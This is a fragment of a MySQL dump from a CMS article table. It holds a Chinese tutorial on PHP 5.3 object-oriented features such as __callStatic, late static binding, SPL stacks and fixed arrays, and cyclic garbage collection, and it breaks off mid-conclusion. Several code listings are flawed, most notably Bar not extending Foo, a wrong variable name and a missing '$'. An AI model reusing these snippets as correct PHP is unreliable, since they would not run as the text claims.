&amp;nbsp;64. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return array(array(''description''=&amp;gt;''MycoolPlugin'',''link''=&amp;gt;''/MyCoolPlugin'')); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;65. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;66. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; public static function getArticles(){ &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;67. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; return array(array(''path''=&amp;gt;''/MycoolPlugin'',''title''=&amp;gt;''This is a really cool article'',''text''=&amp;gt;xxxxxxxxx)); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;68. &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; } &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;69. }&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302788827, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(55, 1, 'PHP5和面向对象编程', '', '', '&lt;div&gt;PHP V5 和面向对象编程&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;与 PHP V4 提供的特性相比，2004 年发布的 PHP V5 在面向对象编程（OOP）和设计方面向前迈出了很大的一步。它提供了一些必要的改进，例如类可见性、合适的构造函数和解构函数、输入提示和类反射（class-reflection）API。它为在 PHP 中进行高级的面向对象编程敞开了大门，并允许实现更加简单的设计模式，以及更好的设计类和 API。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5.3 在 OOP 方面提供了大量渐进式补充。这些改进一直集中在语法补充和性能改进方面。首先，我们将查看静态方法和成员方面的新特性。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;改进静态方法和成员处理&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5 中的一个有用补充就是能够将一个方法或类成员指定为静态的（PHP V4 确实支持对方法和类成员的静态访问，但是不能够将方法或成员指定为专门用于静态访问）。静态访问特别适合实现单一设计模式，在这种模式中只存在一个类实例。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5.3 提供一些特性来增强对类的静态成员和方法的支持。我们将查看最近添加的一种魔术方法：__callStatic()。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;_callStatic() 魔术方法&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5 提供了一些可用于类内部的特别定义的方法，称为魔术方法。当在类内部定义时，这些方法可以提供特殊的功能，并支持重载（允许一种方法接受不同类型的参数）和多态（允许不同数据类型使用相同的接口）。它们还允许通过 PHP 轻松地使用不同类型的 OOP 编程方法和设计模式。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;在 PHP V5.3 中，添加了一种新的魔术方法：__callStatic()。它的工作方式类似于 __call() 魔术方法，后者的设计意图是处理那些没有在类中定义或对类不可见的方法的调用。然而，__callStatic() 是为了处理静态方法调用，这使我们能够更好地设计方法重载。下面给出了一个使用该方法的示例。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 1. 使用 __callStatic() 和 __call() 的示例&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Foo&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static function __callStatic(&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$name,&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$args&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;echo &quot;Called method $name statically&quot;;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public function __call(&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$name,&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$args&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;echo &quot;Called method $name&quot;;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;Foo::dog(); &amp;nbsp; &amp;nbsp; &amp;nbsp; // outputs &quot;Called method dog statically&quot;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$foo = new Foo;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$foo-&amp;gt;dog(); &amp;nbsp; &amp;nbsp; &amp;nbsp;// outputs &quot;Called method dog&quot;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;需要注意，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;动态的静态调用&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP 的一个优秀特性是可变变量。这表示可以使用某个变量的字符串值指定另一个变量的名称。换句话说，可以执行与下面类似的操作。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 2. 可变变量&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;x = ''y'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$$x = ''z'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo $x; &amp;nbsp;// outputs ''y''&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo $$x; //&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;outputs ''z''&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;这也适用于函数，甚至是类方法，如下所示。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 3. 可变函数和类方法名&lt;/div&gt;\r\n&lt;div&gt;class Dog&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public function bark()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;echo &quot;Woof!&quot;;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;$class = ''Dog''&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$action = ''bark'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$x = new $class(); // instantiates the class ''Dog''&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$x-&amp;gt;$action(); &amp;nbsp; &amp;nbsp; // outputs &quot;Woof!&quot;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5.3 的一个新特性就是在进行静态调用时，能够使指定的类名成为一个变量。这提供了一些新的机会，如下所示。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 4. 可变的类命名&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Dog&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static function bark()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; echo &quot;Woof!&quot;;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;$class = ''Dog'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$action = ''bark'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$class::$action(); &amp;nbsp;//outputs &quot;Woof!&quot;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;这一补充完善了 PHP 的可变变量特性，允许将它们应用到涉及 PHP 的所有情形。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;让我们查看一个有关静态方法和成员应用的更有用的增强：延迟静态绑定（late static binding）。&lt;/div&gt;\r\n&lt;div&gt;延迟静态绑定&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;在 V5.3 以前，PHP 存在的麻烦问题是如何处理静态方法和成员。到目前为止，使用自身或 __CLASS__ 进行的静态引用都是在定义函数的类作用域中解析的。问题在于，如果类进行了扩展并且调用来自新的子类，那么解析将是错误的。PHP V5.3 添加了延迟静态绑定来解决这个问题。为了更好地进行解释，我们在下面将创建一个具有静态方法的类。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 5. 使用静态方法 test() 的 Foo 类&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Foo&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;protected static $name = ''Foo'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static function test()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;return self::$name;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;让我们对这个类进行扩展。我们将在子类中重新定义成员 $name。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 6. 子类 Bar 扩展了父类 Foo&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Bar&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;protected static $name = ''Bar'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;我们在清单 7 中进行了静态调用。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 7. 静态方法调用 test()&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;echo Bar::test();&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;该调用的输出是字符串 Foo。这是因为在 test() 方法中进行的引用 self::$name 是在 Foo 类中完成的。这样绑定的原因是：函数是在 Foo 类中定义的。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5.3 添加了关键字 static 以允许针对当前类进行引用。因此将修改上面的 Foo 类以在清单 8 中使用该关键字，我们将看到输出的内容变成了 Bar。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 8. 使用 static 关键字&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Foo&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;protected static $name = ''Foo'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static function test()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;return static::$name;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Bar&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;protected static $name = ''Bar'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;echo Bar::test(); // outputs ''Bar''&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;有关 static 关键字需要注意一点，它的工作方式与在非静态上下文中的工作方式不同。这意味着普通的继承规则没有应用到静态调用中。静态关键字将仅仅尝试在当前类中解析调用，而不是在定义函数的类中执行。这一点值得注意。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;现在您已经了解了有关静态方法和成员的增强，现在让我们看一看 PHP V5 中新添的类，它们构成了非常有用的部分：标准 PHP 库。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;标准 PHP 库&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;标准 PHP 库（Standard PHP Library，SPL）是 PHP V5 中新增的接口和类的集合，旨在解决标准问题。这些问题包括实现可迭代的对象，使对象具有数组的行为或实现一个链接的列表。这些类和方法的优点是它们是原生的 PHP，这意味用 PHP 本身实现它们会获得更快的速度。在很多情况下，这些类和方法还允许内部 PHP 函数直接使用这些对象，就像 Iterator 接口允许您使用 foreach 结构迭代对象一样。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP V5.3 向 SPL 添加了更多的类。我们前面提到一个类就是在 SPL 类 SplDoublyLinkedList 中实现的双重链接列表。它供其他两个新 SPL 类使用：SplStack（实现一个栈）和 SplQueue（实现一个队列）。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;让我们看一看如何使用 SplStack 类实现一个栈。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 9. 使用 SplStack&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;$stack = new SplStack();&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;// push a few new items on the stack&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$stack-&amp;gt;push(''a'');&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$stack-&amp;gt;push(''b'');&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$stack-&amp;gt;push(''c'');&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;// see how many items are on the stack&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo count($stack); // returns 3&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;// iterate over the items in the stack&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;foreach ( $stack as $item )&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;echo &quot;[$item],&quot;; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// the above outputs: [c],[b],[a]&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;// pop an item off the stack&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo $stack-&amp;gt;pop(); // returns ''c''&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;// now see how many items are on the stack&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;echo count($stack); // returns 2&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;SqlQueue 也采取类似的方式，但是它像队列那样工作（先进先出；而不是像栈一样最后一个项进栈，第一个项出栈）。此外，还存在堆实现（SplHeap），以及针对某些情况的特定队列和堆实现（SplMinHeap、SplMaxHeap 和 SplPriorityQueue）。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;另一个有用的补充是 SplFixedArray 类，顾名思义，这是一个固定大小的数组实现。然而，它的性能非常快 — 实际上它在基准测试中要比 PHP 内置数组实现快 10% 至 30%。造成这种速度优势的原因是数组是固定大小的，而默认的 PHP 数组是可变大小的，并且不允许非数值型索引。清单 10 显示了它的使用方法。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 10. SplFixedArray&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;$array = new SplFixedArray(3);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$array[0] = ''dog'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$array[1] = ''cat'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$array[2] = ''bird'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$a-&amp;gt;setSize(4); // increase the size on the fly&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$array[3] = ''mouse'';&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;foreach ( $array as $value )&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;echo &quot;[$value],&quot;;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;Output:&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;[dog],[cat],[bird],[mouse]&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;此外，添加了一些新的迭代器类：FilesystemIterator 和 GlobIterator。它们与 PHP 中的其他迭代器类使用相同的工作方式，但是它们分别针对不同的情况。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;SPL 的另一个改变是现在的 PHP V5.3 通常启用 SPL。在以前的 PHP V5 版本中，可以在编译时禁用 SPL，但是 PHP V5.3 不能禁用 SPL。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;SPL 中的新补充?? PHP 添加了一些有用的并且易于使用的功能，以及数据结构的实现，例如双重链接列表、栈、堆和队列。这些类可用于替换用户空间实现，这将改进速度并更好地集成各种 PHP 函数和构造。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;现在我们已经了解了 SPL 中的一些新内容，让我们看一看 PHP V5.3 中的 OOP 如何通过循环垃圾收集获得显著的性能和内存使用改善。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;循环垃圾收集&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;垃圾收集是 PHP 开发人员在性能方面遇到的一个问题。PHP 有一个非常简单的垃圾收集器，它实际上将对不再位于内存范围（scope）中的对象进行垃圾收集。垃圾收集的内部方式是使用一个引用计数器，因此当计数器达到 0 时（意味着对该对象的引用都不可用），对象将被当作垃圾收集并从内存中删除。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;这种方式工作得很好，但是如果一个对象使用父子关系引用另一个对象，那就会引发问题。在这种情况下，这些对象的引用计数器没有被收集，因此这些对象使用的内存仍然属于未引用的内存，并且直到完成请求后才能够进行分配。下面看一下关于这种问题的例子。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;清单 11. PHP V5.2 及之前版本不能恰当地对父子类关系进行垃圾收集&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Parent&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public function __construct()&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$this-&amp;gt;child = new Child($this);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;class Child&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public function __construct(&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Parent $parent&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;)&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$this-&amp;gt;parent = $parent;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;在这种情况下，每当创建 Parent 类的实例并且该实例随后超出内存范围时，内存不会被释放，因此脚本在内存使用中不断增加。有一些用户空间解决方案可以解决这个问题。例如为父类创建一个解构函数将直接释放子对象。这种解构器必须在解除父类引用之前进行调用。但是执行这些工作会使您的代码也变得非常复杂。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;在 PHP V5.3 中，垃圾收集器将检测这些循环引用，并且能够释放它们所占用的内存，因此在执行脚本时 PHP 内存使用情况将保持平稳。当 Parent 类的每个引用被删除后，Parent 类中的 Child 类引用也将会被当作垃圾收集。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;结束语&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;PHP 在支持面向对象编程方面经历了长期的发展。PHP V4 时期的支持是比较弱的，但在 